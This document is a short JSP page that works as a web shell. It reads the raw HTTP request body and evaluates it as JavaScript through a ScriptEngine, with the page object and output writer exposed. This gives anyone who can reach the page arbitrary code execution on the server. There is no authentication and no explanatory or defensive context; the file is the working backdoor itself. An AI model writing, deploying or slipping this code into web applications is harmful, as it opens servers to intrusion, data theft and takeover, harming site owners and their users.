<%@ page import="java.io.*" %>
<%@ page import="javax.script.ScriptEngine" %>
<%@ page import="javax.script.ScriptEngineManager" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    public String readInputStream(InputStream inputStream) throws IOException {
        int len = 0;
        byte[] buffer = new byte[1024];
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        while((len = inputStream.read(buffer)) != -1){
            baos.write(buffer, 0, len);
        }
        baos.close();
        return baos.toString().trim();
    }
%>
<%
    ScriptEngineManager manager = new ScriptEngineManager();
    ScriptEngine engine = manager.getEngineByName("javascript");

    engine.put("obj", this);
    engine.put("out", out);
	
    BufferedReader br = request.getReader();
    String str, wholeStr = "";
    while((str = br.readLine()) != null) {
        wholeStr += str + "\n";
    }
    if(wholeStr != null && !wholeStr.trim().equals("")){
		wholeStr = wholeStr.substring(0,wholeStr.length()-1);
        engine.eval(wholeStr.trim());
    }
%>